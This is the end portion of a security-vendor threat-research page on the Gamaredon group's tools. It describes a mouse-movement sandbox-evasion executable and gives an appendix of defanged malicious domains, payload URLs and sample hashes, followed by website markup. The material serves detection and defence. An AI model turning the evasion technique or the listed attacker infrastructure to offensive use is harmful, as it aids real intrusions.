binary differencing this malware is likely an updated version of 598c55b89e819b23eac34547ad02e5cd59e1b8fcb23b5063a251d8e8fae8b824.\nwmphost.exe\nThis file runs an infinite loop until mouse movement gets detected, then it exits. This file can be used to circumvent sandboxes that don't simulate mouse movement. To detect if it's running inside a sandbox, another file can scan the list of running processes to see if \"wmphost.exe\" is present or not.\nAppendix B: Indicators of Compromise\nDomain Names\n\nadmin-ru[.]ru\nadobe.update-service[.]net\napploadapp.webhop[.]me\nbrokbridge[.]com\ncat.gotdns[.]ch\ncheck-update[.]ru\nchildrights.in[.]ua\nconhost.myftp[.]org\ndocdownload.ddns[.]net\ndownloads.email-attachments[.]ru\ndownloads.file-attachments[.]ru\ndyndownload.serveirc[.]com\ne.muravej[.]ua\nemail-attachments[.]ru\nfile-attachments[.]ru\nfreefiles.myftp[.]biz\ngetmyfile.webhop[.]me\ngooglefiles.serveftp[.]com\ngrom56.ddns[.]net\ngrom90.ddns[.]net\nhrome-update[.]ru\nhrome-updater[.]ru\nloaderskypetm.webhop[.]me\nloadsoulip.serveftp[.]com\nmail.file-attachments[.]ru\nmails.redirectme[.]net\nmars-ru[.]ru\nmsrestore[.]ru\noficialsite.webhop[.]me\nparkingdoma.webhop[.]me\npoligjong.webhop[.]me\npolistar.ddns[.]net\nproxy-spread[.]ru\nrms.admin-ru[.]ru\nsamotsvety.com[.]ua\nskypeemocache[.]ru\nskypeupdate[.]ru\nspbpool.ddns[.]net\nspread-service[.]ru\nspread-ss[.]ru\nspread-updates[.]ru\nstor.tainfo.com[.]ua\ntortilla.sytes[.]net\nukrnet.serveftp[.]com\nukrway.galaktion[.]ru\numachka[.]ua\nupdate-service[.]net\nupdatesp.ddns[.]net\nupdateviber.sytes[.]net\nwebclidie.webhop[.]me\nwin-restore[.]ru\nwinloaded.sytes[.]net\nwinupdateloader[.]ru\nwww.file-attachments[.]ru\nwww.win-restore[.]ru\nyfperoliz.webhop[.]me\n\nURLs:\n\nhttp:\/\/childrights.in[.]ua\/public\/manager\/img\/scrdll.ini\nhttp:\/\/prestigeclub.frantov[.]com.ua\/press-center\/press\/chrome-xvnc-v5517.exe\nhttp:\/\/umachka[.]ua\/screen\/dk.tmp\nhttp:\/\/umachka[.]ua\/screen\/screen.tmp\nhttp:\/\/viberload.ddns[.]net\/viber.nls\n\nHashes:\n\nSamples using custom developed tools:\n\n002aff376ec452ec35ae2930dfbb51bd40229c258611d19b86863c3b0d156705\n08e69f21c3c60a4a9b78f580c3a55d4cfb74729705b5b7d01c1aecfd58fc49e6\n0c47cf984afe87a14d0d4c94557864ed19b4cb52783e49ce96ebf9c2f8b52d27\n0dc1010c3d3766158e2347d10fc78d9223c6e0e3a44aa8a76622aeff7d429ab9\n0f745512940e0efd8f09c6d862571cba2b98fac9a9f7cf30dedcc08ace43a494\n145dab86a43835bb37734c16756d6d64d8e5ac6b87c491c57385e27b564136b8\n222e85e6d07bdc3a2141cdd582d3f2ed4b1ce5285731cc3f54e6202a13737f8d\n2f2b26f2f7d164ea1f529edbc3cb8a1063b39121dad4dd19d8ee4bbbaf25ed37\n3242183b1f0176a2e3cfb6bfef96b9d55c5a59ea9614dbde4ef89979336b5a5d\n3773ddd462b01f9272656f3150f2c3de19e77199cf5fac1f44287d11593614f9\n37c78ee7826d63bb9219de594ed6693f18da5db60e3cbc86795bd10b296f12ac\n3e5b1116b2dfd99652a001968a05fc962974931a0596153ab0dea8e4a9982f89\n400f53a89d08d47f608e1288d9873bf8d421fc7cd642c5e821674f38e07a1501\n598c55b89e819b23eac34547ad02e5cd59e1b8fcb23b5063a251d8e8fae8b824\n5b22ace98b57ed19d815c49983c96a3c6ff0b2701e8167d4422c6990982abcf9\n5ec8b7ca4461720bd69fb49b3f6cae637d8ac3bbd675da938bc5a84e9b73b395\n840b3d4cc95dbf311f792a9f50137056deb66bfdbb55eb9f54ff381a0df65656\n90ba0f95896736b799f8651ef0600d4fa85c6c3e056e54eab5bb216327912edd\n97ebd7bfad63b36b4572132f6ece359ff9991f269048c0b145411699bfe3dc34\n9a1fd88970da3809f45cef00360d1e54ea11a70035c277c130404a67371e142d\n9cb64d3242d2b591bd2ff13b1aadef2e6b4bf9147f4a0926613b7c9343feb312\na46508ec9e48c256261b2d1914532a36ac7da093253320135d77581051751b75\na7e27ff0695a4bdf58c584f48664acd3a385ccebf3a542fdd6d7383f414aa83a\na804beddd22bb76ea207a9607ed5c888f2f640cbd9ed9a32942fcd0b8a25c4d5\nae5ab2e887a9b46ea7819b7ebbb8163028e66882c97e75b0698dc3a69a69d7da\nb2fb7d2977f42698ea92d1576fdd4da7ad7bb34f52a63e4066f158a4b1ffb875\nb9434e5a14159c49af2d1a5a11d570f195797d6b17aa560c3dde4a5b3486bf2a\nbe2be662cc821a924d5641422dd1116e99188c6923da092ca3f0f8f862bd2d2d\nd01df47b6187631c9a93bdad1298439ab1a1c5529b3319f3614b6ec2455e5726\nd1ba365e93ff0a4f3a2cb1d657568e583e3fbd7dbb1c2c52e28f16480324e3bb\nddfc6bb4819527b2424d6e1a84f04b67adad79401e39efbffba5b7d727e732f0\ndf434f54802a6814628f30cae335c302bae7085c4e8314d71a41a47d9c410c39\ne24715900aa5c9de807b0c8f6ba8015683af26c42c66f94bee38e50a34e034c4\nf2296bcb6be68dfb330baec2091fb11a42a51928ba057164213580e6ff0e1126\u00a0\n\nSamples using bundled commodity tools:\n\n026be8a873560f1496c6961f6e36c312bdda01beacb17c4b744f35ee1923d061\n03c943f5cba11b09b9c3afa0705d4a027e5a9d81b299711740cc5aedfe4b4aa1\n03e5e99cc8280de4663c4b65bfd26782d4975258808a63a4b20bc068008df7f5\n059e40ba91b2b2d827c200476fcbd0fad0d43ab198d0c206c996777d27e6de65\n0669e61e51cf43daa431d52b5461c90bdce1b1bee03b087e4406c30264dcb9a4\n068b9a9194efacc16cf142814e79b7041b6ab3d671a95bb508dbd30061c324aa\n0b4a90b823a581311c4acb59f35e32f81f70ca16a2538f54f4dbe03db93350df\n0b5316d723d1ebbec9aba0c9ff6761050305d644c3eeb5291b4e2c4de9e5fa15\n0b8d59312699739b6e6cb7aeb0f22a2eaebbb0fd898a97ef9b83e8d8e9ce67a0\n0dd13d2d0edbcf9d1825c2bfc165876ada2e4d04e2981a0003cb6503fad2287b\n0ddb7867e31f3f30cd1cfe74393f8ac5bbdc61538278de9219a49345f0d3af7f\n13fed3accac4f38f28e606b110a3b7924d9c7a1a911f8c0613d0bb791e715267\n151cf4c83722ba171ae42640e5e13af67ca06ee0a06a74afa53931acf6ac1506\n17006d77cc1459aa3d70e4e9377edb2547a7446647aa9872c9dd9ad860ed7e39\n1ec7e595677038145991c6d84dc7808602142f258c1f90e9486cca0fe531d74f\n208dc592111a8221a9c633efc120b890585f9a67ed340cbb5ec9db4cd5e164e4\n2124adbee89f2c1cb65896bed26e7ffa8bf0fcbdfeb99a9e751fea9cca7a896b\n22e97292671ada8deef4329eb115c52f6f1bc598bcf01a3961f1c35a2230a013\n259a78122ef51ae503059143bf36941fc6090be83213d196ba3051ba36a0b2a1\n26564c23530dd14e0042e074f4178a5b2ad6fc8f51f10138fc39941a6303bff9\n29453fa1772b6d7d33842d6abbe0cb55c4a4b66a00f43284c8724d7c16749a7d\n2a072d9ce63a94d2530cf9f18a232c6a09f6c7bdff9dbe27faceef53604145ea\n2c02d3d3fadd76f9d21f5c093459ddc0045c94f17679269eb7a2990a1a88cb42\n2d55000bb5cb9e3e1f137810c2e1eb899f68c40e4a6f6307f226c7b8af208abd\n2ded2f3b5b5b6155ce818893c67887cbfa8b539be6c983e314ccf2177552da20\n2e89436b355550ceb361fac1b03b78b71eda11d25f26223ac5c8c34ed8972a05\n32b0e6394b110860371da5541946a6dcc85358a3951eddc86fdaf5794527c150\n33934fcfae5760316b3f40e013cbb03d8086f8c30f9a4ba9bed3f9486a530796\n34d86602882e86f8aaaeb7513126c8579a4489f2be31c279188e2f2ca8a0e141\n390162dae62a0347e35cf5dad093cfc2f7d4ded62fba9d2df7af6133feb41ee0\n3ef8602579c6b145fbaafc8970b4c9a6e7bebd11eb5e37eecaa67b4572c6038b\n420acd7e8598fe994b59bf5d30f89e1c11b36cbef464a4786694cf9eada8dd4c\n42b4c39179f76ea9eb5835b55a3cf4d8dbb29d42ee0622ad2e89ca48d01e8988\n42eed03907c9dfa0e566fbe5968cdb5a1b7b5e18521f7327185ed2208c6c29b4\n46a39da996b01e26ddd71d51c9704de2aa641cd3443f6fe0e5c485f1cd9fa65d\n47d929c69bfd8d8efb9c280eabec2f73d4bddf1c3c30120c3fb6334623469888\n505ef8cbc1271ce32f0c473468d75a1aba5073c37b2e6b49293ddc9efcb4ac96\n5230453eeb98c5a183129ed8b918b429e96020887302ba30941c408108a1ab84\n5363220b532d7da378b338e839a501ae5c006cc03c8b2d3627c480d64deb1221\n558f33d478091993e5b5921604f8c3873efc87f551fddf61612b5c64d5b610f6\n55c76f4f93f9e155fbb6a28447f97c1ccda0081061dc3cb9973d42c1686964b7\n56c8246819f7de5cba91001793831441d4ce998ccb8237cb96c9f52e88ea384b\n59bddb5ccdc1c37c838c8a3d96a865a28c75b5807415fd931eaff0af931d1820\n5ac627f8964d3b9cad69f21e3b8f27305f1f68f49e4f4fae2c73949a04b32692\n5ccc76ae1cdf668ba7f89c6cbd0bad44f148cbee736320ead237262ba170ffba\n5cd4401c1dae9b9ecd75c96ab29dc64ce40bef3acc6faf7c001ff98ebd3b3413\n5cd72eaf555813f1ee187def594584f5cfc6a5e83086f35e281327b5210adffb\n5f8293eda9fb40684caddf576eba6c81f3a06911ca9e4ecf84ede3b2891cff5e\n6c258151c593268c13c252d8f275192a6f7a74d5de5754f2cf20fb94be7ee6ea\n0458e168baa4fa5942892065925ac82b12245551b539d54c2884b3a21c2699d8\n877f1de209eb9d8b2a20a76f8773d12e5a1fcde4148868c7b73added392f62f6\n29c728a169c5d18298e77db161dd5d2f6396ceca9ee7849b63ff8a8bc11f911e\n98e092b7bfc3bbdaeb82e05de14ba5835c6ac626c17de9eef2049796a031dd10\n27e08fb90ada2fd8ce6b6149786edd3b814dd0324257ebd919ed66ada0334b21\n9f651ae6ea538238748614a7f86fe2b0f76e881d6c38da581f284e4b6f79b0ca\nf47115ea58615781e56dcac673c19edf7ce00defd7ada709ae97b0708d3eac1e\nb80719854f8744ba62e9f0e774c09e2e2ed79dd37f9f94ba3ed05ec8507d55e6\n467f04914a1e6093bdaf5c28884bf95ec738234033b3292d289a0799de196d49\n5c47d18b3f0e0274c6a66b2eab27d47c73a0105c263d41c6473aba9a28d0a4ba\n01c5729ac1ae3928053c085fd616323a3715863ab3d7e9b8106c09e24df34183\n5b6a691cf8faf238b27861941a1b667d889889cc9711a3e561403d6a6ed292c9\ne2688f72cc7ae836be19e765e39318873554ee194a09945eb3f3805d04f256ca\n9f0228e3d1577ffb2533584c2b1d87ebee0c0d490f981e61d18bb27ab02e52cb\n2617f9301869304b88d8a3a4f7b2eab6b0edf264cc1a28b99f5685959242ec39\nf3107a5a00f36e12be7cc2e37c35903ef855b8043492af374ea918385821443c\n63fcfab8e9b97d9aec3d6f243003ea3e2bf955523f08e6f1c0d1e28c839ee3d5\n05cbe01b1125897e0e982c587a10a72f4df795b844a4a2c4cec44aee7f30ce94\n5a7da102c11960b9651650143a4a08ae4ce97d68dff999961f1ffc792531afeb\ndf6112e6bad4125b80b8829c13a2ca523bb82cf303cf531389d8795e7512c7e6\ncfb8216be1a50aa3d425072942ff70f92102d4f4b155ab2cf1e7059244b99d31\ne79dbcc8b60da280e53d9cf818eee1de34251e0551b9947bb2b79a31b131417e\na73eac15797130c381b5b4a65c3fb1cfc723b1586a1882c981211787bba285a6\n3ef3a06605b462ea31b821eb76b1ea0fdf664e17d010c1d5e57284632f339d4b\nf2355a66af99db5f856ebfcfeb2b9e67e5e83fff9b04cdc09ac0fabb4af556bd\nca87eb1a21c6d4ffd782b225b178ba65463f73de6f4c736eb135be5864f556dc\n550ee89d5df17f90ba7689d957cd067dcdbe3d957c5369ea28d925e02ccc8ce6\nf77d7940c51c2a1eab849dbd77e59c683ebf7820799ef349e7da2583e1aa11ae\n2c5d55619d2f56dc5824a4845334e7804d6d306daac1c23bec6f078f30f1c825\n7231177a115656041ba4e5b3cf0bf7a547b074f03592351484267e25cda7c899\nd5405f99cec0166857274b6c02a7ef52b36274fedb805a17d2089fd24ed133cf\n81921b6a7eba39a3f73895a57892ed3a46ab6365ac97d550ca3b9bff46c7a1c2\n1eef9f8d7d3099b87be7ac25121f9d2ccacfb5ccf02b508fb2036b6e059c525f\n5255061c3600df1a94b376fca40f3ccb69d1cb6dd42aa744b20a643c7292d20c\nb5199a302f053e5e9cb7e82cc1e502b5edbf04699c2839acb514592f2eeabb13\n5fb7f6f953be3b65d88bd86d1391ebc9f88fc10b0ef23541463ebf5b157f695c\n6016cf9898d74e2e9030be7c987964d817ba28ad2253d1da54c81a1bf49db836\n621e55421dffae981e3e933c65626314d5610c7c08f76f83a3d07f0ec6c36e2d\n6ccc24971073d24d90c4cbaf83dfbae2969cbf527e319c7ee9a4babcbe88e456\n6f8da9180eebe02ba35317cb8aee5c8df6ac29795af70eb9430c3588d457aad6\n71c5b899a5187baeb8f605ca39ca56bf05a63025a8f9f84c45590d8345e5d349\n725b7d92ed66be160f2e04395008a65c72814d5ddf842d9778396f6c6679d85e\n72d4b780a90ede7ea152f5da0973965cab31d2813fa8c2fe0e1cb611f5ca257e\n73670d06851f588c7df44dc478f49883406697c48c618438e0f249b7a916552e\n74e017853fbc85ee77ca7476cd25423815602aaaa02b29e0003c95c9551b8890\n75d2367dc79d9f8aed165729df90ed5d28fefe267778dbe4d3d74aafa75d66e0\n7a5a1c6ea0c2f017df9f06975c93a356cac20b19031fcde96136fa5881e5ef3a\n7adb049e0b49312aea904c70e16d0e7f03d01aae4bf8ac867e8219ced4e6e057\n7bfa85bec239b6c4419b2d57149c5960263c80e493f888d03ceaaa3f945b1b25\n7f324b658f587b3b27921ebeba5ac25aebd669b33e6801fa9581de8c2eb0df2e\n7fee970748eb83045e36911dafdaee0d4069ebe72c059cc7de3d65539012c2e9\n823793a37d748ffe708864c16c853c67a5db812712481da1d24790b455163940\n8512aabfa0175684bdbb77481d6b272b63dbc4249b04a44e1003b7d8fdea0a89\n86c81f03cf7d8f8af38c2559dbf506cccdc25579f3b29fb574f823a67f99a0a3\n88ae7e60b9dd57fc6b2d667ce33fb29c0f75d37eb7c837ccf56cb7994386d5ef\n8b50e3ca06a22d0be6a71232b320137c776f80ac3f2c81b7440b43854b8a3bf0\n8bd40e7fe6bbd4d5810db2c142186bb58da445a132fb6f9ff01c46947a532244\n8c9d690e765c7656152ad980edd2200b81d2afceef882ed81287fe212249f845\n8d38726d674279705fe06b4b45bbbaef10756c547d560cea6998e23dba09f80c\n8db47439685edc683765abb5e6d7d0d05479bf9ee164992db9e8ce97fe43ee2f\n95de2e16f1b05d1b45b1d182c1503568c2e5fd4a81ac52fe1bc9e881d1a272b1\n95e3204228341852b7c97f357f799e7ec9688abe1262436b569e56397f1fd864\n98caf00760d772598386eb8d4f26caf92fb891915ac08da6bf830be5e45278d3\n99c9440a84cdc428ce140de901452eb334faec49f1f6258acdde1ddcbb34376e\n9a8776e4ae38cf529bab28947b31ade84301262b7996dc37ec47afa4fb4cf6e1\n9beb1d2a03ff2d4c15913de0f87b72074155b44df791bd967dac8155e97a0e06\n9c8d518fbbc8cbb25fa309f5396efa5749e57a3b0158779404c8d3e92baf6596\na064a28e5e7409a96bba93fc57f44cadc3492bb0f49792c89c973e30b0f5d498\na194b47043356fa365d98a5f7c582b6f87fac90acf0f469ed3651cfe2fd7b2c9\na21dfb8e8b7c8dfbeeb4d72e6ef1f22c667b8968b3a3b1dcce99f44faab05903\na2e0fe2d385dabcdfb024100216d259ddd1fa9907e982d297846fd29b8d4d415\na48ad33695a44de887bba8f2f3174fd8fb01a46a19e3ec9078b0118647ccf599\na595da9a2fa58d4f8be0bfbcf7f4c950435ff5289dd1ccf2c65eec73a0afe97f\na972ad0ddc00d5c04d9fe26f1748e12008efdd6524c9d2ea4e6c2d3e42d82b7b\naa860d405746401ae4155485326fdeb39718832c77c73540d48f4fbb8e596215\nab6832a4432b4bdaec0706f7b00a369c48175eac9abc3e537032b1f5d26a993b\nada2f0703614b3447d427827777af5d4ee9ffe9179498970326926751a4f8d65\nb16d317c11228bd3573126a0e1bc0bbf35d84a4a1f47dfb06b70634a21fd9823\nb3665548cc0f2fce3593fb7139f49588faa1d327b6d23feb564ca4194053ae8a\nb5578c48a11533871ae91e6d5632aafc25d3976c0626d62abab306663566d024\nb67a6f87fc3fd7c5c3666acac5918c8c08a53ab6a966f4d1daf38105a566ede1\nb6abc8ab631dcf52e028ab26dbe3bb94022d69193c0acc8642cbd6329cbb23ef\nb7e117eb342b0d450095805073326989c792bf5ccbbdcd5f4a9ace50e517412e\nbb14abc9b0798c7756a6ed887308a3e6210cc08a5149dc1360fdd1f5bca27cca\nbdadb319f071f02462d107380102b669e407bb2a0b20e77a9a8a5726b4cbbc4b\nbf2383cfbee4cbb0bda2614839454ab1724c9bbfff8b4b48e0f48579ae220c10\nbf52b44168de1855d83186163a2d5f29e488ddafdfd5447e211aec4a769cf74a\nc0d5cf7a0035deda5646aaf520b3ff632aa6be76ddbc88f38ddc11e77ffb40b4\nc1a82a788df7418712664138c0fdb05232036a27ab0998479d60c656998849f1\nc63a523834ab59ab5621a0acb156a9b901befe806044642fe5fec8a0ba545e70\nd05d3f3582e13eaf5f39d7143ca1a4b1367cc5267bf9958a15e27cf53e059518\nd0e456cff03c2483ded9a0f8c1b99f9fefb6ba47dcaf949dae27abe940ee20e6\nd8a01f69840c07ace6ae33e2f76e832c22d4513c07e252b6730b6de51c2e4385\ndada74663e3e29ee26bfd03a888f0bda9fc81e148511fa98f73f8e8a915933cc\ndb3ffcbf136e0268ec66f28b30fa8ba350f74e02e8e737e61cc6ef8d8258027e\ndd26b85b6568595b1d2bbc47ce47d071ede75665fbd779d637b74663ead5539e\ndf9038660164623a827a8119d4cb3d71d0a5288b12bdfdd32c72769bf90a9ea0\ndfed16e9184a86e6fcd17a98f127410840d058db667e9975b43add100c33122e\ne0063d2524a89159cf5da12661225fbb27725bbd72acd9497b7207ecf2f3aeb6\ne00c55ddda9cbb82fb47924fafdf40c3394dc1127d9901c71a69ef3ef664b817\ne14a51d69211948163ab20b0cc68adf410bb821f2890f55d2d202c745f4ec1b8\ne2e3f243bbcad666852e64202d35f6dd88c58f5d24435d92975697b0efa8a775\ne37e25739e8bc4620d9d37d8f6b400cd82c85b89d206436ba35930ed96db6eb0\ne55b5ede808b6d491f18737d6a1cf34b5178f02e9ea01d7cff31a449888dbd73\ned28d9207acac2afff817eaa56d1599422e23946dffa4f8bade376d52a6af7d4\neda0853e814ee31a66c3b42af45cd66019ffd61eac30e97bd34c27d79253a1bb\nf1b3e58d060803b0ff6008386bab47fb8099ac75ee74f385ac34340a28bf716e\nf2091f71227180d74ba1ba4607635e623553b1826314dca91cb31839eb00c4ea\nf214d55ccb5db5edbaafe7d40b240c79f04c70d441adee01ef438f776eb37037\nf571ddc894915dee136cf24731ff3d79fe4f811b112d122a34a128628cb43c4a\nf7676d2a28992a382475af2ae0abca4794e1397ef3327f30f7d4cbdbc2ca0a68\nf8e20894c8c18d79e80b431008aa8bef46cc10a355a4934f9cc40ffd637b8890\nfa1bf7565352099b74624c8beeff6620411e1efe00e54f8b4190f69e243d5811\nfa784f69265ebe5e150cf5956a40d86335d1a5edc57fffcc7ce6eedc591c2751\n\n&nbsp;","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2016\/09\/unit42-web-banner-650x300-150x150.jpg","width":150,"height":150},"author":[{"@type":"Person","name":"Anthony Kasza"},{"@type":"Person","name":"Dominik Reichel"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='bodhi-svgs-attachment-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/svg-support/css/svgs-attachment.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpp_params = {"sampling_active":"0","sampling_rate":"100","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":"24675","token":"b09d8c8c9d","debug":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp-5.0.0.min.js?ver=5.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.3.5'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=24675' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit-42-title-gamaredon-group-toolset-evolution%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit-42-title-gamaredon-group-toolset-evolution%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.3.5 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>
  <body class="post-template-default single single-post postid-24675 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                  <a href="https://www.paloaltonetworks.com/">
<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
